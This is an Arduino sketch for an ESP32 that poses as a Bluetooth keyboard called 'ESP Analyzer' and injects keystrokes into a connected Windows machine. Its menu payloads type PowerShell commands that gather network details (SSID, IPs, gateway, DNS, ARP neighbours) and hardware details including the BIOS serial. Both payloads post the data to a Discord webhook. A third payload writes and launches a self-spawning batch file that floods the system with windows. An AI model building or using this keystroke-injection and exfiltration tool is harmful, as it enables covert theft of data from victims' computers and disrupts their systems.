#include <BleKeyboard.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

#define BTN_UP 19
#define BTN_DOWN 18
#define BTN_SEL 17

BleKeyboard bleKeyboard("ESP Analyzer", "ESP32", 100);
Adafruit_SSD1306 display(128, 64, &Wire, -1);

const String discordURL = "[your-discord-webhook]";

int menuIdx = 0;
const int maxItems = 3;
const char* menuItems[] = {"1. Network Report", "2. Hardware Report", "3. System Crash"};

void setup() {
  Wire.begin(21, 22);
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.setTextColor(WHITE);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_SEL, INPUT_PULLUP);
  bleKeyboard.begin();
}

void inject(String cmd) {
  if(!bleKeyboard.isConnected()) return;
  
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  delay(500);
  bleKeyboard.releaseAll();
  delay(1000); 
  
  bleKeyboard.print("powershell");
  bleKeyboard.write(KEY_RETURN);
  delay(2000); 

  for(int i = 0; i < cmd.length(); i++) {
    bleKeyboard.write(cmd[i]);
    delay(15); 
  }
  bleKeyboard.write(KEY_RETURN);
}

void executeTask() {
  if(!bleKeyboard.isConnected()) return;

  display.clearDisplay();
  display.setCursor(0, 30);
  display.println("INITIATING...");
  display.display();

  String u = discordURL;

  switch(menuIdx) {
    case 0: 
      inject("$u='" + u + "'; "
             "$ssid=(netsh wlan show int | Select-String ' SSID' | ForEach-Object {$_.ToString().Split(':')[1].Trim()}); "
             "$intIP=(Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias 'Wi-Fi').IPAddress; "
             "$extIP=(Invoke-RestMethod -Uri 'https://api.ipify.org' -UseBasicParsing); "
             "$gate=(Get-NetRoute -DestinationPrefix '0.0.0.0/0').NextHop; "
             "$dns=(Get-DnsClientServerAddress -InterfaceAlias 'Wi-Fi').ServerAddresses -join ', '; "
             "$neighbors=(arp -a | Select-String 'dynamic' | Select-Object -First 8 | ForEach-Object {$_.ToString().Trim()}) -join \"`n\"; "
             "$out=\"[NETWORK REPORT]`nSSID: $ssid`nInternal IP: $intIP`nExternal IP: $extIP`nGateway: $gate`nDNS: $dns`n`nNearby Devices:`n$neighbors\"; "
             "$msg=@{content='```' + $out + '```'}|ConvertTo-Json; "
             "Invoke-RestMethod -Uri $u -Method Post -Body $msg -ContentType 'application/json'; "
             "sleep 1; 'A' | Out-Null");
      break;
      
    case 1: 
      inject("$u='" + u + "'; "
             "$cpu=(Get-WmiObject Win32_Processor).Name; "
             "$gpu=(Get-WmiObject Win32_VideoController).Name; "
             "$ram=[math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2); "
             "$mb=(Get-WmiObject Win32_BaseBoard).Manufacturer + ' ' + (Get-WmiObject Win32_BaseBoard).Product; "
             "$disks=(Get-WmiObject Win32_DiskDrive | ForEach-Object {$_.Model + ' (' + [math]::Round($_.Size/1GB,0) + 'GB)'}) -join ', '; "
             "$os=(Get-WmiObject Win32_OperatingSystem).Caption + ' (Build ' + (Get-WmiObject Win32_OperatingSystem).BuildNumber + ')'; "
             "$uptime=(Get-Date) - ( [Management.ManagementDateTimeConverter]::ToDateTime((Get-WmiObject Win32_OperatingSystem).LastBootUpTime)); "
             "$sn=(Get-WmiObject Win32_Bios).SerialNumber; "
             "$out=\"[HARDWARE REPORT]`nOS: $os`nCPU: $cpu`nGPU: $gpu`nRAM: $ram GB`nMB: $mb`nDisks: $disks`nSerial: $sn`nUptime: $($uptime.Days)d $($uptime.Hours)h\"; "
             "$msg=@{content='```' + $out + '```'}|ConvertTo-Json; "
             "Invoke-RestMethod -Uri $u -Method Post -Body $msg -ContentType 'application/json'");
      break;
      
    case 2: 
      inject("cmd /c \"echo @echo off > c.bat & echo :a >> c.bat & echo start msg * BYE BYE! >> c.bat & echo start notepad >> c.bat & echo start c.bat >> c.bat & echo goto a >> c.bat & c.bat\"");
      break;
  }
}

void loop() {
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("--- ESP ANALYZER ---");
  display.println(bleKeyboard.isConnected() ? "  READY" : "  WAITING...");
  display.println("\nSELECT:");
  for(int i=0; i<maxItems; i++) {
    display.print(i == menuIdx ? "> " : "  ");
    display.println(menuItems[i]);
  }
  display.display();

  if(digitalRead(BTN_UP) == LOW) { menuIdx = (menuIdx > 0) ? menuIdx - 1 : maxItems - 1; delay(200); }
  if(digitalRead(BTN_DOWN) == LOW) { menuIdx = (menuIdx + 1) % maxItems; delay(200); }
  if(digitalRead(BTN_SEL) == LOW && bleKeyboard.isConnected()) { executeTask(); delay(1000); }
  delay(10);
}